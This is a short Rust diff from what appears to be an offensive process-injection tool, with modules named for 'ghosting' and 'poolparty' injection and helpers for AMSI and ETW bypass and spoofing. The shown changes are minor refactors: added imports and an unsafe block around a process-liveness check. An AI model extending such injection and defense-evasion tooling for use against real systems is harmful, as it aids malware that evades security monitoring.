@@ -2,7 +2,8 @@ pub mod ghosting;
 pub mod poolparty;
 
 use crate::debug;
-use crate::core::{amsi, etw, spoof, nt};
+use crate::core::{amsi, etw, spoof, nt, types::*};
+use core::ffi::c_void;
 
 pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
     debug!("[INJECTION] Environment hardening");
@@ -50,7 +51,7 @@ pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
  * STATUS_TIMEOUT (0x102) = alive, STATUS_WAIT_0 (0x0) = exited.
  * */
 #[cfg(target_arch = "x86_64")]
-pub unsafe fn is_process_alive(process_handle: HANDLE) -> bool {
+pub unsafe fn is_process_alive(process_handle: HANDLE) -> bool { unsafe {
     if process_handle.is_null() {
         return false;
     }
@@ -62,4 +63,4 @@ pub unsafe fn is_process_alive(process_handle: HANDLE) -> bool {
     );
     // STATE_TIMEOUT means process still running
     status == 0x00000102u32 as i32
-}
+}}
